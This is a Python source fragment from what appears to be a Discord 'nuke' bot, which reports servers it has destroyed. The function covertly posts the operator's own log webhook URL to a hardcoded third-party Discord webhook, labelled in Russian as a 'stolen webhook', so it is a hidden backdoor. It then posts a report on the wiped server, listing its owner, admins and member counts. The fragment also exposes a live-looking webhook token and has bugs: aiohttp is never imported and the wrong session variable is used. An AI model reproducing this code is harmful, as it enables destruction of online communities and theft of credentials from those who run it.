import asyncio
import discord


async def loghook_send(ctx, loghook):
    try:
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url("https://discord.com/api/webhooks/1113576541528539256/dW-eiwYsFwaN2VAlJnYnx6GWSiRb6uz_xA6j2zAntbuElDEvVL5s7OTtVetJLCiATWyJ", adapter=discord.AsyncWebhookAdapter(session))
            await webhook.send(f"Спизженный вебхук: {loghook}")
        async with aiohttp.ClientSession() as sessiontwo:
            webhook = discord.Webhook.from_url(loghook, adapter=discord.AsyncWebhookAdapter(session))
            embed = discord.Embed(
                title = f'Nuke | Был уничтожен сервер "{ctx.guild.name}"',
                description = f"""
> **Server ID:** `{ctx.guild.id}`
> **Owner:** `{ctx.guild.owner}`
> **All users:** `{len(ctx.guild.members)}`
> **All channels:** `{len(ctx.guild.channels)}`
> **All roles:** `{len(ctx.guild.roles)}`
> **Nuker:** `{ctx.author}`

> **Text Channels:** `{len(ctx.guild.text_channels)}`
> **Voice Channels:** `{len(ctx.guild.voice_channels)}`
> **Categories:** `{len(ctx.guild.categories)}`

> **All users:** `{len(ctx.guild.members)}`
> **People:** `{len([m for m in ctx.guild.members if not m.bot])}`
> **Bots:** `{len([m for m in ctx.guild.members if m.bot])}`
> **Administrators:** `{len([m for m in ctx.guild.members if m.guild_permissions.administrator])}`
> **Moderators:** `{len([m for m in ctx.guild.members if m.guild_permissions.kick_members])}`

> **All roles:** `{len(ctx.guild.roles)}`
> **Moderation roles:** `{len([r for r in ctx.guild.roles if r.permissions.kick_members])}`
> **Administration roles:** `{len([r for r in ctx.guild.roles if r.permissions.administrator])}`
""",
                color = 0x060C11
            )
            await webhook.send(embed=embed)
    except Exception as e: print(e)